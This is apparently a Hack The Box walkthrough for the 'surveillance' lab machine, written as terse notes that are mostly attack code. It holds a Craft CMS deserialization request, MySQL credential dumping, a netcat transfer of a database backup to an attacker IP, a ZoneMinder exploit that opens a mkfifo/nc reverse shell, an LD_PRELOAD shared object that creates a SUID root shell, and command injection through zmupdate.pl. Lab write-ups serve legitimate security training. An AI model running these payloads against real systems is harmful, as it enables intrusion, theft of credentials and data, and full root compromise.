# CVE 
https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226

```
POST / HTTP/1.1
Host: surveillance.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Length: 214

action=conditions/render&configObject[class]=craft\elements\conditions\ElementCondition&config={"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}
```

# file path
```shell
/var/www/html/craft/web/index.php
```
# found mysql password on .env file two directories above the current dir
```shell

mysql -h localhost -u craftuser -pCraftCMSPassword2023! craftdb -e "show tables;" 
mysql -h localhost -u craftuser -pCraftCMSPassword2023! craftdb -e "select * from users;"

admin/matthew:$2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe
```
# has a sql backup file on ../../storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip

# transferred the file using netcat
```shell
cat surveillance--2023-10-17-202801--v4.4.14.sql.zip | nc 10.10.14.84 4444
```

matthew:starcraft122490

# forwarded port 8080 to using ssh

```shell
ssh matthew@surveillance.htb -L 8080:localhost:8080
```

# port 8080 uses a vulnerable zoneminder version v1.36.32

https://github.com/heapbytes/CVE-2023-26035?tab=readme-ov-file

```shell
python3 exploit.py  --target http://127.0.0.1:8080/ --cmd "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.84 4444 >/tmp/f"

```

# zoneminder user has sudo privilege  /usr/bin/zm*.pl *
# zoneminder LD_PRELOAD

```c++
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("cp /bin/bash /tmp/ch1");
system("chown root:root /tmp/ch1");
system("chmod 4755 /tmp/ch1");

}

```

```shell
gcc -fPIC -shared -o /tmp/expl2.so exploit.c -nostartfiles

```
# created a c shared file that copies the bash executable to /tmp, changed it to a SUID, then on the zoneminder service, changed the LD_PRELOAD to /tmp/expl2.so and executed 
```shell
sudo zmupdate.pl startup
```

# it creates a SUID file that can be executed to escalate privileges to root

# straight forward privesc
```shell
sudo /usr/bin/zmupdate.pl --version 10 -u '$(cat /root/root.txt)'
```